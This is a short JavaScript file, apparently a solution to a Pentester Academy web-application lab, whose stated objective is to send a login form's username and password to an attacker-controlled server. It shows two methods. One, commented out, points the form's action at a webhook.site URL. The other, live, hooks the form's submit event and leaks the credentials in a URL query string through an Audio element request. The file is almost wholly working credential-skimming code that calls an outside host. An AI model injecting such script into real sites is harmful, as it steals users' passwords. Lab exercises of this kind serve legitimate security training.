// https://pentesteracademylab.appspot.com/lab/webapp/jfp/3

// Objectives:
//     Post the Username and Password to Attacker Controlled Server


// First Method
// const form = document.getElementsByClassName('form-signin')[0];
// form.action = 'https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57';form.method = 'get';


// Second Method
const form = document.getElementsByClassName('form-signin')[0];
form.addEventListener('submit', function() {
    var username = document.getElementsByClassName('input-block-level')[0].value;
    var password = document.getElementsByClassName('input-block-level')[1].value;
    
    new Audio().src='https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57/?username='+username+'&password='+password;
})